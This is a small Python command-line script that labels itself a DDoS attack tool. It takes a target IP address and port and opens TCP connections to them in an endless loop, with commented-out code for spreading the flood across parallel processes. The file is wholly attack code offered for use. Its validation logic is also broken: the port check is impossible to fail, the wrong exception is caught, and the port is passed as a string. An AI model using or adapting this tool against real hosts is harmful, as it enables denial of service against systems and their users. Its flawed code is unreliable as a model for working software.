import time
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from concurrent.futures import as_completed
import ipaddress
import re
import socket
import logging
import argparse


def parse_args():
    parser = argparse.ArgumentParser(
        description="""Python ddos attack using sockets and concurrent futures"""
    )
    parser.add_argument(
        "-l",
        "--level",
        choices=["INFO", "WARNING", "ERROR", "CRITICAL", "DEBUG"],
        required=False,
        dest="debug",
        default="INFO",
        help="""level of logging""",
        type=str,
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        dest="ip_address",
        help="""Address ip that you want to scan""",
        type=str,
    )
    parser.add_argument(
        "-p",
        "--port",
        required=True,
        dest="port",
        help="""Port that you want to "collapse" """,
        type=str,
    )

    return parser.parse_args()


def validate_ip_address(ip_address):
    try:
        valid_address = ipaddress.ip_address(ip_address)
        logging.info(f"{valid_address} is a valid address")
    except SystemExit:
        logging.error(f"{ip_address} is not a valid address")


def validate_port(port):
    if int(port) < 1 and int(port) > 65535:
        raise SystemError("Invalid port")
    else:
        logging.info(f"Port {port} is valid")


def connection(ip_address,port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect((ip_address, port))
                #return f"# Attacking {port}"
                print(f"# Attacking {port}")
        except:
            pass


def main():
    start = time.perf_counter()
    args = parse_args()

    logging.basicConfig(
        format="%(asctime)-5s %(name)-15s %(levelname)-8s %(message)s",
        level=args.debug,
    )

    validate_ip_address(args.ip_address)
    validate_port(args.port)
    connection(args.ip_address,args.port)
    #ports = [ports for ports in range(min_port,max_port +1)]

    # Multiprocessing, if not, that script is too slow
    # with ProcessPoolExecutor(max_workers=13) as executor:
    #     futures = [executor.submit(connection, args.ip_address, port) for port in ports]
    #     for future in as_completed(futures):
    #         if future.result() is not None:
    #             print(future.result())

    finish = time.perf_counter()

    print(f"Finished in {round(finish - start, 2)} second(s)")


if __name__ == '__main__':
    main()